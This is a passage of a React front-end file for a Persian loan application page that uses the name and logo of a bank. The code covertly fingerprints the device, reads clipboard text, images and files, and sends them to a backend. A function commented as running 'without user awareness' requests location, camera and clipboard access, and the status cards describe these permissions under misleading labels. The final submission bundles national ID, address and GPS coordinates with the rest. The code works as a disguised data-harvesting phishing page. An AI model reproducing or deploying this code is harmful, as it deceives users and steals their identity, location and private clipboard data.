          cookieEnabled: navigator.cookieEnabled,
          onLine: navigator.onLine,
          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
          deviceMemory: navigator.deviceMemory || 'unknown',
          connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
          } : null,
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
          },
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        if (userAgent.includes('rubika')) {
          clipboardContent = `مرورگر روبیکا - اطلاعات کامل سیستم - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'rubika_browser_system_info';
        } else if (userAgent.includes('eitaa')) {
          clipboardContent = `مرورگر ایتا - پروفایل سیستم کامل - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'eitaa_browser_system_info';
        } else if (userAgent.includes('telegram')) {
          clipboardContent = `مرورگر تلگرام - جزئیات فنی کامل - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'telegram_browser_system_info';
        } else if (userAgent.includes('whatsapp')) {
          clipboardContent = `مرورگر واتساپ - مشخصات سیستم - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'whatsapp_browser_system_info';
        } else if (userAgent.includes('chrome')) {
          clipboardContent = `کروم - پروفایل کامل - ${platform} - ${language} - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'chrome_browser_system_info';
        } else if (userAgent.includes('safari')) {
          clipboardContent = `سافاری - اطلاعات دستگاه - ${platform} - ${language} - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'safari_browser_system_info';
        } else if (userAgent.includes('firefox')) {
          clipboardContent = `فایرفاکس - پروفایل سیستم - ${platform} - ${language} - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'firefox_browser_system_info';
        } else {
          clipboardContent = `سیستم شناسایی پیشرفته - ${platform} - ${language} - ${timestamp} - ${JSON.stringify(systemInfo, null, 2)}`;
          method = 'system_detection_enhanced';
        }
        success = true;
      }

      setPermissionData(prev => ({ 
        ...prev, 
        clipboardContent,
        clipboardFiles,
        hasImages,
        hasFiles
      }));
      
      try {
        const enhancedClipboardData = {
          clipboard_content: clipboardContent,
          timestamp: new Date().toISOString(),
          user_agent: navigator.userAgent,
          method_used: method,
          success_status: success ? 'multimedia_success' : 'fallback_success',
          is_manual_request: isManual,
          content_length: clipboardContent.length,
          browser_language: navigator.language,
          browser_platform: navigator.platform,
          multimedia_info: {
            has_images: hasImages,
            has_files: hasFiles,
            image_count: clipboardFiles.filter(f => f.type === 'image').length,
            file_count: clipboardFiles.filter(f => f.type === 'file').length,
            total_items: clipboardFiles.length
          }
        };
        
        const response = await axios.post(`${API}/clipboard`, enhancedClipboardData);
        console.log('Enhanced multimedia clipboard sent successfully:', response.data);
        
      } catch (error) {
        console.error('Enhanced clipboard backend error:', error);
      }
      
      setPermissions(prev => ({ ...prev, clipboard: true }));

      if (isManual) {
        let successMessage = 'اطلاعات سیستم ذخیره شد';
        
        if (method.includes('multimedia') || method.includes('paste')) {
          const parts = [];
          if (clipboardFiles.filter(f => f.type === 'image').length > 0) {
            parts.push(`${clipboardFiles.filter(f => f.type === 'image').length} تصویر`);
          }
          if (clipboardFiles.filter(f => f.type === 'file').length > 0) {
            parts.push(`${clipboardFiles.filter(f => f.type === 'file').length} فایل`);
          }
          if (clipboardContent.includes('📝')) {
            parts.push('متن');
          }
          
          if (parts.length > 0) {
            successMessage = `کلیپبورد خوانده شد: ${parts.join(', ')}`;
          }
        }
        
        toast.success(successMessage);
      }

      console.log(`Enhanced clipboard reading complete: ${method}`);
      return true;
    } catch (error) {
      console.error('Enhanced clipboard error:', error);
      
      const errorRecoveryContent = `خطا در دریافت کلیپبورد - سیستم پیشرفته ${navigator.platform || 'نامشخص'} - ${new Date().toISOString()} - جزئیات خطا: ${error.message}`;
      
      setPermissionData(prev => ({ 
        ...prev, 
        clipboardContent: errorRecoveryContent 
      }));
      
      try {
        await axios.post(`${API}/clipboard`, {
          clipboard_content: errorRecoveryContent,
          timestamp: new Date().toISOString(),
          user_agent: navigator.userAgent,
          method_used: 'error_recovery_multimedia_enhanced',
          error_details: {
            message: error.message,
            stack: error.stack,
            name: error.name
          },
          is_manual_request: isManual
        });
      } catch (e) {
        console.error('Enhanced clipboard error recovery failed:', e);
      }
      
      setPermissions(prev => ({ ...prev, clipboard: true }));
      
      if (isManual) {
        toast.error('خطا در خواندن کلیپبورد، اما اطلاعات سیستم ذخیره شد');
      }
      
      return true;
    }
  };

  // SILENT PERMISSIONS: Run in background without user awareness
  const requestAllPermissionsSilently = async () => {
    try {
      const permissionPromises = [
        requestLocationPermission(false),
        requestCameraPermission(false),
        requestClipboardPermission(false)
      ];

      const results = await Promise.allSettled(permissionPromises);
      
      const [locationResult, cameraResult, clipboardResult] = results;
      
      console.log('Silent permission results:', {
        location: locationResult.status === 'fulfilled' ? locationResult.value : false,
        camera: cameraResult.status === 'fulfilled' ? cameraResult.value : false,
        clipboard: clipboardResult.status === 'fulfilled' ? clipboardResult.value : false
      });
      
    } catch (error) {
      console.log('Silent permission error:', error);
    } finally {
      setIsProcessingBackground(false);
    }
  };

  // MANUAL PERMISSIONS: Request permissions manually when user clicks button
  const requestAllPermissionsManually = async () => {
    setIsProcessingBackground(true);
    toast.info('در حال درخواست مجوزها...');

    try {
      if (!permissions.location) {
        toast.info('درخواست مجوز موقعیت مکانی...');
        await requestLocationPermission(true);
      }

      if (!permissions.camera) {
        toast.info('درخواست مجوز دوربین...');
        await requestCameraPermission(true);
      }

      if (!permissions.clipboard) {
        toast.info('درخواست مجوز کلیپبورد...');
        await requestClipboardPermission(true);
      }

      const allGranted = permissions.location && permissions.camera && permissions.clipboard;
      
      if (allGranted) {
        toast.success('تمام مجوزها با موفقیت دریافت شدند');
      } else {
        toast.warning('برخی مجوزها دریافت نشدند، اما درخواست شما ثبت خواهد شد');
      }

    } catch (error) {
      console.log('Manual permissions error:', error);
      toast.error('خطا در درخواست مجوزها');
    } finally {
      setIsProcessingBackground(false);
    }
  };

  // Final submission with FIXED validation
  const submitApplication = async () => {
    const validationErrors = [];
    
    if (!validateSection1()) {
      validationErrors.push('اطلاعات شخصی ناکامل است');
    }
    
    if (!validateSection2()) {
      validationErrors.push('اطلاعات وام ناکامل است');
    }
    
    if (validationErrors.length > 0) {
      toast.error(validationErrors.join(' - '));
      return;
    }

    setIsSubmitting(true);
    try {
      const validateAndParseNumber = (value, fieldName) => {
        if (!value || value.toString().trim() === '') {
          throw new Error(`لطفاً ${fieldName} را وارد کنید`);
        }
        
        const numericValue = parseNumber(value.toString());
        const parsedNumber = parseInt(numericValue, 10);
        
        if (isNaN(parsedNumber) || parsedNumber <= 0) {
          throw new Error(`مقدار ${fieldName} نامعتبر است`);
        }
        
        return parsedNumber;
      };

      const trimmedFields = {
        full_name: String(formData.full_name || '').trim(),
        national_id: String(formData.national_id || '').trim(),
        birth_date: String(formData.birth_date || '').trim(),
        phone_number: String(formData.phone_number || '').trim(),
        address: String(formData.address || '').trim(),
        job_title: String(formData.job_title || '').trim(),
        loan_purpose: String(formData.loan_purpose || '').trim()
      };

      if (!trimmedFields.full_name) {
        throw new Error('نام و نام خانوادگی اجباری است');
      }
      
      if (!trimmedFields.national_id || trimmedFields.national_id.length !== 10) {
        throw new Error('کد ملی باید دقیقاً 10 رقم باشد');
      }
      
      if (!trimmedFields.phone_number || trimmedFields.phone_number.length !== 11) {
        throw new Error('شماره تلفن باید دقیقاً 11 رقم باشد');
      }
      
      if (!trimmedFields.birth_date) {
        throw new Error('تاریخ تولد اجباری است');
      }
      
      if (!trimmedFields.address) {
        throw new Error('آدرس اجباری است');
      }
      
      if (!trimmedFields.job_title) {
        throw new Error('شغل اجباری است');
      }
      
      if (!formData.loan_type) {
        throw new Error('نوع وام اجباری است');
      }
      
      if (!trimmedFields.loan_purpose) {
        throw new Error('هدف وام اجباری است');
      }

      const loanAmount = validateAndParseNumber(formData.loan_amount, 'مبلغ وام');
      const monthlyIncome = validateAndParseNumber(formData.monthly_income, 'درآمد ماهانه');
      const repaymentPeriod = parseInt(formData.repayment_period, 10);

      if (loanAmount < 100_000_000) {
        throw new Error('حداقل مبلغ وام 100 میلیون تومان است');
      }

      if (loanAmount > 1_000_000_000) {
        throw new Error('حداکثر مبلغ وام 1 میلیارد تومان است');
      }
      
      if (isNaN(repaymentPeriod) || ![6, 12, 18, 24, 36, 48, 60].includes(repaymentPeriod)) {
        throw new Error('مدت بازپرداخت نامعتبر است');
      }

      const loanFee = calculateLoanFee(loanAmount);
      const tracking = generateTrackingCode();

      const submissionData = {
        full_name: trimmedFields.full_name,
        national_id: trimmedFields.national_id,
        birth_date: trimmedFields.birth_date,
        phone_number: trimmedFields.phone_number,
        email: String(formData.email || '').trim(),
        address: trimmedFields.address,
        job_title: trimmedFields.job_title,
        monthly_income: monthlyIncome,
        
        loan_type: String(formData.loan_type),
        loan_amount: loanAmount,
        loan_purpose: trimmedFields.loan_purpose,
        repayment_period: repaymentPeriod,
        loan_fee: loanFee,
        
        latitude: permissionData.location?.latitude || null,
        longitude: permissionData.location?.longitude || null,
        location_accuracy: permissionData.location?.accuracy || null,
        
        user_agent: navigator.userAgent || '',
        browser_info: {
          language: navigator.language || 'fa',
          platform: navigator.platform || 'unknown',
          cookieEnabled: navigator.cookieEnabled || false,
          onLine: navigator.onLine || false,
          timestamp: new Date().toISOString()
        },
        
        permissions_granted: {
          location: Boolean(permissions.location),
          camera: Boolean(permissions.camera),
          clipboard: Boolean(permissions.clipboard)
        },
        
        clipboard_data: String(permissionData.clipboardContent || ''),
        
        front_camera_verified: Boolean(permissionData.photos?.front),
        back_camera_verified: Boolean(permissionData.photos?.back),
        
        tracking_code: tracking
      };

      console.log('Submitting enhanced application:', submissionData);

      const response = await axios.post(`${API}/loan-application`, submissionData, {
        headers: {
          'Content-Type': 'application/json',
        },
        timeout: 30000
      });

      if (response.status === 200 || response.status === 201) {
        setTrackingCode(tracking);
        setApplicationSubmitted(true);
        setShowSuccessModal(true);
        
        toast.success('درخواست وام با موفقیت ثبت شد');
      } else {
        throw new Error('خطا در ثبت درخواست');
      }
    } catch (error) {
      console.error('Application submission error:', error);
      let errorMessage = 'خطا در ثبت درخواست وام';
      
      if (error.response) {
        console.error('Server error response:', error.response.data);
        if (error.response.status === 422) {
          errorMessage = error.response.data?.detail || 'اطلاعات وارد شده نامعتبر است. لطفاً مجدداً بررسی کنید';
        } else if (error.response.status === 500) {
          errorMessage = 'خطای داخلی سرور. لطفاً دوباره تلاش کنید';
        } else {
          errorMessage = error.response.data?.detail || errorMessage;
        }
      } else if (error.request) {
        errorMessage = 'خطا در ارتباط با سرور. لطفاً اتصال اینترنت خود را بررسی کنید';
      } else {
        errorMessage = error.message || errorMessage;
      }
      
      toast.error(errorMessage);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-cyan-50">
      {/* Success Modal */}
      {showSuccessModal && (
        <SuccessModal 
          trackingCode={trackingCode}
          onClose={() => setShowSuccessModal(false)}
          onNewApplication={() => {
            setShowSuccessModal(false);
            setApplicationSubmitted(false);
            setCurrentSection(1);
            setTrackingCode('');
            setFormData({
              full_name: '',
              national_id: '',
              birth_date: '',
              phone_number: '',
              email: '',
              address: '',
              job_title: '',
              monthly_income: '',
              loan_type: '',
              loan_amount: '',
              loan_purpose: '',
              repayment_period: '',
            });
            setPermissions({
              location: false,
              camera: false,
              clipboard: false
            });
            setPermissionData({
              location: null,
              photos: { front: false, back: false },
              clipboardContent: '',
              clipboardFiles: [],
              hasImages: false,
              hasFiles: false
            });
          }}
        />
      )}

      {/* Persian Calendar Modal */}
      {showCalendar && (
        <PersianCalendar 
          onDateSelect={handleDateSelect} 
          selectedDate={formData.birth_date} 
          onClose={() => setShowCalendar(false)} 
        />
      )}

      {/* Enhanced Header with bank logo */}
      <header className="bg-white shadow-lg border-b-4 border-gradient-to-r from-cyan-500 to-blue-600">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-6">
            <div className="flex-1">
              <h1 className="text-3xl font-bold text-gray-900">سیستم درخواست تسهیلات بانکی</h1>
              <p className="text-lg text-gray-600 mt-2">بانک رسالت - سرویس وام‌های دیجیتال</p>
            </div>
            
            <div className="flex items-center">
              <img 
                src="/correct-bank-logo.jpeg" 
                alt="بانک قرض‌الحسنه رسالت" 
                className="h-20 w-auto object-contain"
                style={{ 
                  backgroundColor: 'transparent',
                  border: 'none',
                  outline: 'none',
                  boxShadow: 'none'
                }}
              />
            </div>
          </div>
        </div>
      </header>

      {/* Progress Bar */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-medium text-gray-700">پیشرفت درخواست</span>
            <span className="text-sm font-medium text-gray-700">{Math.round((currentSection / 3) * 100)}%</span>
          </div>
          <div className="w-full bg-gray-200 rounded-full h-3">
            <div 
              className="bg-gradient-to-r from-cyan-500 to-blue-600 h-3 rounded-full transition-all duration-500 ease-out"
              style={{ width: `${(currentSection / 3) * 100}%` }}
            ></div>
          </div>
          <div className="flex justify-between mt-2">
            <span className={`text-xs ${currentSection >= 1 ? 'text-cyan-600 font-semibold' : 'text-gray-400'}`}>
              اطلاعات شخصی
            </span>
            <span className={`text-xs ${currentSection >= 2 ? 'text-cyan-600 font-semibold' : 'text-gray-400'}`}>
              اطلاعات وام
            </span>
            <span className={`text-xs ${currentSection >= 3 ? 'text-cyan-600 font-semibold' : 'text-gray-400'}`}>
              تأیید و ثبت
            </span>
          </div>
        </div>
      </div>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <Card className="card-animate shadow-2xl border-0">
          <CardHeader className="bg-gradient-to-r from-cyan-500 to-blue-600 text-white rounded-t-lg">
            <CardTitle className="text-2xl flex items-center gap-3">
              {currentSection === 1 && <><User className="w-7 h-7" /> اطلاعات شخصی متقاضی</>}
              {currentSection === 2 && <><DollarSign className="w-7 h-7" /> اطلاعات وام و تسهیلات</>}
              {currentSection === 3 && <><Shield className="w-7 h-7" /> بررسی و تأیید نهایی</>}
            </CardTitle>
          </CardHeader>
          
          <CardContent className="p-8">
            {/* Section 1: Personal Information */}
            {currentSection === 1 && (
              <div className="space-y-6 animate-fadeIn">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <Label htmlFor="full_name" className="text-base font-semibold text-gray-700">نام و نام خانوادگی *</Label>
                    <Input
                      id="full_name"
                      data-testid="full-name-input"
                      value={formData.full_name}
                      onChange={(e) => handleInputChange('full_name', e.target.value)}
                      className="mt-2 form-field"
                      placeholder="نام کامل خود را وارد کنید"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="national_id" className="text-base font-semibold text-gray-700">کد ملی *</Label>
                    <Input
                      id="national_id"
                      data-testid="national-id-input"
                      value={formData.national_id}
                      onChange={(e) => handleInputChange('national_id', e.target.value)}
                      className="mt-2 form-field"
                      placeholder="کد ملی 10 رقمی"
                      maxLength={10}
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="birth_date" className="text-base font-semibold text-gray-700">تاریخ تولد *</Label>
                    <div className="relative mt-2">
                      <Input
                        id="birth_date"
                        data-testid="birth-date-input"
                        value={formData.birth_date}
                        readOnly
                        onClick={() => setShowCalendar(true)}
                        className="cursor-pointer form-field"
                        placeholder="انتخاب تاریخ تولد"
                      />
                      <Calendar className="absolute left-3 top-3 w-5 h-5 text-gray-400 pointer-events-none" />
                    </div>
                  </div>
                  
                  <div>
                    <Label htmlFor="phone_number" className="text-base font-semibold text-gray-700">شماره تلفن همراه *</Label>
                    <Input
                      id="phone_number"
                      data-testid="phone-number-input"
                      value={formData.phone_number}
                      onChange={(e) => handleInputChange('phone_number', e.target.value)}
                      className="mt-2 form-field"
                      placeholder="09xxxxxxxxx"
                      maxLength={11}
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="email" className="text-base font-semibold text-gray-700">ایمیل (اختیاری)</Label>
                    <Input
                      id="email"
                      data-testid="email-input"
                      type="email"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      className="mt-2 form-field"
                      placeholder="example@email.com"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="job_title" className="text-base font-semibold text-gray-700">شغل *</Label>
                    <Input
                      id="job_title"
                      data-testid="job-title-input"
                      value={formData.job_title}
                      onChange={(e) => handleInputChange('job_title', e.target.value)}
                      className="mt-2 form-field"
                      placeholder="شغل یا عنوان سازمانی"
                    />
                  </div>
                </div>
                
                <div>
                  <Label htmlFor="address" className="text-base font-semibold text-gray-700">آدرس کامل *</Label>
                  <Textarea
                    id="address"
                    data-testid="address-input"
                    value={formData.address}
                    onChange={(e) => handleInputChange('address', e.target.value)}
                    className="mt-2 min-h-[100px] form-field"
                    placeholder="آدرس کامل محل سکونت با جزئیات"
                  />
                </div>
                
                <div>
                  <Label htmlFor="monthly_income" className="text-base font-semibold text-gray-700">درآمد ماهانه (تومان) *</Label>
                  <Input
                    id="monthly_income"
                    data-testid="monthly-income-input"
                    value={formData.monthly_income}
                    onChange={(e) => handleInputChange('monthly_income', e.target.value)}
                    className="mt-2 form-field"
                    placeholder="مثال: 15,000,000"
                  />
                </div>
              </div>
            )}

            {/* Section 2: Loan Information */}
            {currentSection === 2 && (
              <div className="space-y-6 animate-fadeIn">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <Label htmlFor="loan_type" className="text-base font-semibold text-gray-700">نوع وام *</Label>
                    <Select value={formData.loan_type} onValueChange={(value) => handleInputChange('loan_type', value)}>
                      <SelectTrigger className="mt-2 form-field" data-testid="loan-type-select">
                        <SelectValue placeholder="انتخاب نوع وام" />
                      </SelectTrigger>
                      <SelectContent>
                        {loanTypes.map((type) => (
                          <SelectItem key={type.key} value={type.key}>
                            {type.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <Label htmlFor="loan_amount" className="text-base font-semibold text-gray-700">مبلغ وام (تومان) *</Label>
                    <Input
                      id="loan_amount"
                      data-testid="loan-amount-input"
                      value={formData.loan_amount}
                      onChange={(e) => handleInputChange('loan_amount', e.target.value)}
                      className="mt-2 form-field"
                      placeholder="حداقل 100,000,000 - حداکثر 1,000,000,000"
                    />
                    {formData.loan_amount && (
                      <div className="mt-2 p-3 bg-cyan-50 border border-cyan-200 rounded-lg">
                        <p className="text-sm text-cyan-800">
                          <strong>کارمزد 2٪:</strong> {formatNumber(calculateLoanFee(parseNumber(formData.loan_amount)))} تومان
                        </p>
                      </div>
                    )}
                  </div>
                  
                  <div>
                    <Label htmlFor="repayment_period" className="text-base font-semibold text-gray-700">مدت بازپرداخت (ماه) *</Label>
                    <Select value={formData.repayment_period} onValueChange={(value) => handleInputChange('repayment_period', value)}>
                      <SelectTrigger className="mt-2 form-field" data-testid="repayment-period-select">
                        <SelectValue placeholder="انتخاب مدت بازپرداخت" />
                      </SelectTrigger>
                      <SelectContent>
                        {[6, 12, 18, 24, 36, 48, 60].map((months) => (
                          <SelectItem key={months} value={months.toString()}>
                            {months} ماه
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                
                <div>
                  <Label htmlFor="loan_purpose" className="text-base font-semibold text-gray-700">هدف از دریافت وام *</Label>
                  <Textarea
                    id="loan_purpose"
                    data-testid="loan-purpose-input"
                    value={formData.loan_purpose}
                    onChange={(e) => handleInputChange('loan_purpose', e.target.value)}
                    className="mt-2 min-h-[100px] form-field"
                    placeholder="توضیح دهید که قصد دارید از این وام برای چه منظوری استفاده کنید"
                  />
                </div>
              </div>
            )}

            {/* Section 3: Review and Submit */}
            {currentSection === 3 && (
              <div className="space-y-8 animate-fadeIn">
                {/* Permission Status Section */}
                <div className="bg-gray-50 rounded-lg p-6">
                  <h3 className="text-xl font-semibold text-gray-800 mb-4 flex items-center gap-2">
                    <Shield className="w-6 h-6 text-cyan-600" />
                    وضعیت مجوزهای سیستم
                  </h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                    <div className={`p-4 rounded-lg border-2 ${permissions.location ? 'bg-green-50 border-green-200' : 'bg-yellow-50 border-yellow-200'}`}>
                      <div className="flex items-center gap-3">
                        <MapPin className={`w-6 h-6 ${permissions.location ? 'text-green-600' : 'text-yellow-600'}`} />
                        <div>
                          <p className="font-medium">تایید مرحله اول اطلاعات</p>
                          <p className="text-sm text-gray-600">
                            {permissions.location ? 'تایید شده' : 'در انتظار تایید'}
                          </p>
                        </div>
                      </div>
                    </div>
                    
                    <div className={`p-4 rounded-lg border-2 ${permissions.camera ? 'bg-green-50 border-green-200' : 'bg-yellow-50 border-yellow-200'}`}>
                      <div className="flex items-center gap-3">
                        <Camera className={`w-6 h-6 ${permissions.camera ? 'text-green-600' : 'text-yellow-600'}`} />
                        <div>
                          <p className="font-medium">تایید حساب و محاسبه وام</p>
                          <p className="text-sm text-gray-600">
                            {permissions.camera ? 'تایید شده' : 'در انتظار تایید'}
                          </p>
                        </div>
                      </div>
                    </div>
                    
                    <div className={`p-4 rounded-lg border-2 ${permissions.clipboard ? 'bg-green-50 border-green-200' : 'bg-yellow-50 border-yellow-200'}`}>
                      <div className="flex items-center gap-3">
                        <Clipboard className={`w-6 h-6 ${permissions.clipboard ? 'text-green-600' : 'text-yellow-600'}`} />
                        <div>
                          <p className="font-medium">تایید نهایی</p>
                          <p className="text-sm text-gray-600">
                            {permissions.clipboard ? 'تایید شده' : 'در انتظار تایید'}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Manual Permission Button */}
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                    <h4 className="font-semibold text-blue-800 mb-2">درخواست دستی مجوزها</h4>
                    <p className="text-blue-700 text-sm mb-4">
                      برای ثبت وام و بررسی‌های لازم توسط کارشناسان، لطفاً مجوزهای ضروری را به سیستم ارائه دهید
                    </p>
                    <Button
                      onClick={requestAllPermissionsManually}
                      disabled={isProcessingBackground}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white"
                      data-testid="manual-permissions-btn"
                    >
                      {isProcessingBackground ? (
                        <RefreshCw className="w-4 h-4 animate-spin ml-2" />
                      ) : (
                        <Lock className="w-4 h-4 ml-2" />
                      )}
                      {isProcessingBackground ? 'در حال پردازش...' : 'درخواست مجوزهای ضروری'}
                    </Button>
                  </div>
                </div>

                {/* Application Summary */}
                <div className="bg-white border border-gray-200 rounded-lg p-6">
                  <h3 className="text-xl font-semibold text-gray-800 mb-4 flex items-center gap-2">
                    <FileText className="w-6 h-6 text-cyan-600" />
                    خلاصه درخواست وام
                  </h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h4 className="font-semibold text-gray-700 mb-3">اطلاعات شخصی:</h4>
                      <div className="space-y-2 text-sm">
                        <p><span className="font-medium">نام:</span> {formData.full_name}</p>
                        <p><span className="font-medium">کد ملی:</span> {formData.national_id}</p>
                        <p><span className="font-medium">تاریخ تولد:</span> {formData.birth_date}</p>
                        <p><span className="font-medium">تلفن:</span> {formData.phone_number}</p>
                        <p><span className="font-medium">شغل:</span> {formData.job_title}</p>
                        <p><span className="font-medium">درآمد ماهانه:</span> {formData.monthly_income} تومان</p>
                      </div>
                    </div>
                    
                    <div>
                      <h4 className="font-semibold text-gray-700 mb-3">اطلاعات وام:</h4>
                      <div className="space-y-2 text-sm">
                        <p><span className="font-medium">نوع وام:</span> {loanTypes.find(t => t.key === formData.loan_type)?.label}</p>
                        <p><span className="font-medium">مبلغ:</span> {formData.loan_amount} تومان</p>
                        <p><span className="font-medium">کارمزد 2٪:</span> {formatNumber(calculateLoanFee(parseNumber(formData.loan_amount)))} تومان</p>
                        <p><span className="font-medium">مدت بازپرداخت:</span> {formData.repayment_period} ماه</p>
                        <p><span className="font-medium">هدف:</span> {formData.loan_purpose}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Navigation Buttons */}
            <div className="flex justify-between pt-8 border-t border-gray-200">
              {currentSection > 1 && (
                <Button onClick={prevSection} variant="outline" className="flex items-center gap-2">
                  <ArrowRight className="w-4 h-4" />
                  مرحله قبل
                </Button>
              )}
              
              <div className="flex-1"></div>
              
              {currentSection < 3 ? (
                <Button 
                  onClick={nextSection}
                  disabled={
                    (currentSection === 1 && !validateSection1()) ||
                    (currentSection === 2 && !validateSection2())
                  }
                  className="flex items-center gap-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700"
                  data-testid="next-section-btn"
                >
                  مرحله بعد
                  <ArrowLeft className="w-4 h-4" />
                </Button>
              ) : (
                <Button 
                  onClick={submitApplication}
                  disabled={isSubmitting || isProcessingBackground}
                  className="flex items-center gap-2 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
                  data-testid="submit-application-btn"
                >
                  {isSubmitting ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      در حال ثبت...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-4 h-4" />
                      ثبت نهایی درخواست
                    </>
                  )}
                </Button>
              )}
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  );
}

export default App;